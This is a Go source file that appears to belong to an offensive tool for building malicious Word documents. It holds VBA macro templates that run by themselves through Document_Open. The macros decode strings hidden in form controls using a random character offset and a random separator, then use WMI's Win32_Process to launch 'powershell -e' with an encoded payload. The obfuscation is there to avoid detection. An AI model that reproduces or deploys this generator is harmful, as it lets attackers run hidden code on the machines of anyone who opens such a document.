package resources

import (
	"fmt"
	"math/rand"
	"time"

	"github.com/oxis/gocro/pkg/obf"
)

func init() {
	rand.Seed(time.Now().UTC().UnixNano())
}

// DocumentOpen Document entry point
var DocumentOpen string = `
Private Sub Document_Open()
%s = Array(EntryPoint() + 1)
End Sub
`

// EntryPointFunction Macro main
var EntryPointFunction string = `
Public Function EntryPoint()
Dim part1 As String
part1 = Decode(Ssplit(UserForm1.TextBox1, UserForm1.Label2))
Dim part2 As String
part2 = Decode(Ssplit(UserForm1.TextBox2, UserForm1.Label2))

GetObject(part1).Get(part2).Create Decode(Ssplit(UserForm1.TextBox3, UserForm1.Label2))
EntryPoint = 2
End Function

Public Function Ssplit(str As String, sep As String)
Ssplit = Split(str, sep)
End Function

Public Function Decode(arrayofWords As Variant)
    Dim ret As String
    Dim offset As Integer
    offset = UserForm1.Label1
    For counter = LBound(arrayofWords) To UBound(arrayofWords)
    ret = ret + (Chr(arrayofWords(counter) + offset))
    Next
    Decode = ret
End Function
`
var Label1 string = fmt.Sprint(rand.Intn(128))
var Label2 string = obf.RandStringBytes(3)

// Just easier to understand
var Offset string = Label1
var Sep string = Label2

var TextBox1 string = "winmgmts:"
var TextBox2 string = "Win32_Process"
var TextBox3 string = "powershell -e %s"
